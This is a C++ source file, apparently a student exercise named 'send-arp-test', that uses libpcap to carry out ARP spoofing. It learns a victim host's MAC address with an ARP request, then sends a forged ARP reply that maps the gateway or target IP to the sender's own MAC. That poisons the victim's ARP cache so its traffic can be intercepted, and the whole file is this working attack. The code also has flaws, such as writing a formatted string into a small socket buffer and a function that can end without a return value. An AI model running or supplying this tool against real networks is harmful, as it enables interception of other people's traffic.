#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <ifaddrs.h>
#include <netinet/in.h> 
#include <string.h> 
#include <arpa/inet.h>
#include<linux/sockios.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}


char* getIpAddress(char* dev){
	 int fd;
	 struct ifreq ifr;
	 fd = socket(AF_INET, SOCK_DGRAM, 0);
	 ifr.ifr_addr.sa_family = AF_INET; //get IPv4
	 strncpy(ifr.ifr_name, dev, IFNAMSIZ-1); //ip attatce to enp0s3

	 ioctl(fd, SIOCGIFADDR, &ifr);
	 close(fd);
	 return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

 Mac getMacAddress(char* dev)
{
	struct ifreq s;
	int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
	char* mac ;	
	strcpy(s.ifr_name, dev);
	ioctl(fd, SIOCGIFHWADDR, &s);
	mac = reinterpret_cast<char *>(s.ifr_addr.sa_data);

	sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", 
	(unsigned char)s.ifr_hwaddr.sa_data[0],
	(unsigned char)s.ifr_hwaddr.sa_data[1],
	(unsigned char)s.ifr_hwaddr.sa_data[2],
	(unsigned char)s.ifr_hwaddr.sa_data[3],
	(unsigned char)s.ifr_hwaddr.sa_data[4],
	(unsigned char)s.ifr_hwaddr.sa_data[5]);

	close(fd);
	return Mac(mac);
}


int sendRequest(char* myIp, Mac myMac, char* sender_ip, pcap_t* handle){	
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); //unknown mac
	packet.eth_.smac_ = myMac; //source mac (my mac)
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	
	packet.arp_.smac_ = myMac; // source mac(my mac)
	packet.arp_.sip_ = htonl(Ip(myIp)); // source ip ( sender ip )
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");// target mac
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	
	pcap_close(handle);
	return 1;
}


Mac getSenderMac(char* dev,char* senderIP,Mac myMac){
    
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
	}

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(pcap, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}
		struct EthHdr *eth;
		struct ArpHdr *arp_h;
			
		eth = (struct EthHdr *)packet;
		packet +=sizeof(struct EthHdr);
		arp_h = (struct ArpHdr *)packet;
			
	    	uint16_t eth_type = ntohs(eth -> type_);//0806  
		uint8_t op_type = arp_h->op();
		Mac smac = arp_h -> smac();
		Mac dmac = arp_h -> tmac();
		Ip sip = arp_h -> sip();
		Ip tip = arp_h -> tip();
		
		if (eth_type == 0x0806 && op_type==0x02){
			if(dmac==myMac && sip==Ip(senderIP))
				return smac;
		}	 
		
	}
      pcap_close(pcap);

}


void sendArpRequest(char* dev, Mac myMac, Mac smac, char* gatewayIp, char* senderIp){

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	EthArpPacket packet;

	packet.eth_.dmac_ = smac; // sender mac
	packet.eth_.smac_ = myMac; // my mac
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = myMac; //my mac 
	packet.arp_.sip_ = htonl(Ip(gatewayIp)); //gateway ip
	packet.arp_.tmac_ = smac; //sender mac
	packet.arp_.tip_ = htonl(Ip(senderIp)); //sender ip 

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

	pcap_close(handle);


}


int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];	
	
	for (int i=2; i<argc; i+=2){
		char* sender_ip = argv[i];
		char* target_ip = argv[i+1];
	      
	      char errbuf[PCAP_ERRBUF_SIZE];
	      pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	      if (handle == nullptr){
		 fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		 return -1;
	      }
	      char* myIp = getIpAddress(dev);
	      Mac myMacAddress = getMacAddress(dev);

	      int request_result = sendRequest(myIp, myMacAddress, sender_ip, handle);
	      
	      Mac sender_mac = getSenderMac(dev, sender_ip,myMacAddress);
	      sendArpRequest(dev,myMacAddress,sender_mac,target_ip,sender_ip);   
	
	}
	

}


